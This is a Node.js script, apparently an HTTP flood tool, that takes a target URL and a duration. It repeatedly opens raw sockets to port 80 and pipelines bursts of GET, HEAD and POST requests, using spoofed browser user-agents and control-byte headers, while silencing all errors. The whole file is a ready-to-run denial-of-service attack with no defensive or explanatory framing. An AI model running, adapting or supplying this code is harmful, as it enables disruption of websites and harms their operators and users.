const fs = require('fs');
const url = require('url');
const net = require('net');
if (process.argv.length <= 2) {
	console.log("node raw.js url time");
	process.exit(-1);
}
var target = process.argv[2];
var parsed = url.parse(target);
var host = url.parse(target).host;
var time = process.argv[3];

process.on('uncaughtException', function (e) { });
process.on('unhandledRejection', function (e) { });

const userAgents = [
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0"
];

const nullHexs = [
    "\x00", "\xFF", "\xC2", "\xA0", "\x01", "\x02", "\x03", "\x04", 
    "\x05", "\x06", "\x07", "\x08", "\x0B", "\x0C", "\x0E", "\x0F",
    "\x10", "\x11", "\x12", "\x13", "\x14", "\x15", "\x16", "\x17",
    "\x18", "\x19", "\x1A", "\x1B", "\x1C", "\x1D", "\x1E", "\x1F"
];

var int = setInterval(() => {
    var s = require('net').Socket();
    s.connect(80, host);
    s.setTimeout(10000);
    for (var i = 0; i < 50; i++) {
        s.write(
            'GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + 
            '\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + 
            '\r\n\r\n');
                                                     
		s.write(
		    'HEAD ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + 
		    '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' +
		    '\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + 
		    '\r\nUpgrade-Insecure-Requests: 1' +
		    '\r\nAccept-Encoding: gzip, deflate' +
		    '\r\nAccept-Language: en-US,en;q=0.9' +
		    '\r\nCache-Control: max-age=0' +
		    '\r\nConnection: Keep-Alive\r\n\r\n');
		    
		s.write(
            'POST ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + 
            '\r\nuser-agent: ' + nullHexs[Math.floor(Math.random() * nullHexs.length)] + 
            '\r\n\r\n');
    }
    s.on('data', function () {
        setTimeout(function () {
            s.destroy();
            return delete s;
        }, 5000);
    })
});
setTimeout(() => clearInterval(int), time * 1000);